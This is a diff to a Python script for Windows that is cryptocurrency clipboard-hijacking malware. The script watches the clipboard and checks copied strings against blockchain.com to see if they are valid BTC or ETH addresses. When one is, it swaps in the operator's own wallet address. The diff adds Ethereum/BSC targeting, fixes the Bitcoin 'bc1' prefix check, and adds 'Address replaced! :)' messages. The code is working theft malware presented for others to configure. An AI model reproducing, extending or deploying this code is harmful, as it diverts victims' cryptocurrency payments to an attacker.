@@ -7,6 +7,7 @@ from win32com.client import Dispatch
 import pywintypes
 import time
 
+# Configure for you !
 def config(name):
     global info_o2
 
@@ -14,15 +15,19 @@ def config(name):
         alternative = ""
         return alternative
 
-    if name == 'wallet-1':
+    if name == 'wallet-btc-1':
         alternative = ""
         return alternative
 
-    if name == 'wallet-bc1':
+    if name == 'wallet-btc-bc1':
         alternative = ""
         return alternative
 
-    if name == 'wallet-3':
+    if name == 'wallet-btc-3':
+        alternative = ""
+        return alternative
+
+    if name == 'wallet-eth&bsc':
         alternative = ""
         return alternative
 
@@ -76,32 +81,35 @@ while True:
         time.sleep(1)
         continue
 
-    if len(data) > 30 and not data in [config('wallet-1'),config('wallet-bc1'),config('wallet-3')]:
+    if len(data) > 30 and not data in [config('wallet-btc-1'),config('wallet-btc-bc1'),config('wallet-btc-3'),config('wallet-eth&bsc')]:
         try:
-            req = requests.get("https://www.blockchain.com/btc/address/"+data, timeout=8)
+            req1 = requests.get("https://www.blockchain.com/btc/address/"+data, timeout=8)
+            req2 = requests.get("https://www.blockchain.com/eth/address/"+data, timeout=8)
         except:
             continue
-        if req.status_code == 200:
-            print('A valid address found !')
+        if req1.status_code == 200:
+            print('A valid BTC address found !')
             if data[0] == '1':
                 while True:
                     try:
                         win32clipboard.OpenClipboard()
                         win32clipboard.EmptyClipboard()
-                        win32clipboard.SetClipboardText(config('wallet-1'))
+                        win32clipboard.SetClipboardText(config('wallet-btc-1'))
                         win32clipboard.CloseClipboard()
                         time.sleep(1)
+                        print('Address replaced! :)')
                         break
                     except:
                         pass
-            elif data[0] == 'bc1':
+            elif data[:3] == 'bc1':
                 while True:
                     try:
                         win32clipboard.OpenClipboard()
                         win32clipboard.EmptyClipboard()
-                        win32clipboard.SetClipboardText(config('wallet-bc1'))
+                        win32clipboard.SetClipboardText(config('wallet-btc-bc1'))
                         win32clipboard.CloseClipboard()   
-                        time.sleep(1)                 
+                        time.sleep(1)
+                        print('Address replaced! :)')
                         break
                     except:
                         pass
@@ -110,16 +118,29 @@ while True:
                     try:
                         win32clipboard.OpenClipboard()
                         win32clipboard.EmptyClipboard()
-                        win32clipboard.SetClipboardText(config('wallet-3'))
+                        win32clipboard.SetClipboardText(config('wallet-btc-3'))
                         win32clipboard.CloseClipboard()
                         time.sleep(1)
+                        print('Address replaced! :)')
                         break
                     except:
                         pass
             else:
                 pass
-        else:
-            pass
+
+        if req2.status_code == 200:
+            print('A valid ETH address found !')
+            while True:
+                try:
+                    win32clipboard.OpenClipboard()
+                    win32clipboard.EmptyClipboard()
+                    win32clipboard.SetClipboardText(config('wallet-eth&bsc'))
+                    win32clipboard.CloseClipboard()
+                    time.sleep(1)
+                    print('Address replaced! :)')
+                    break
+                except:
+                    pass
     else:
         pass
 
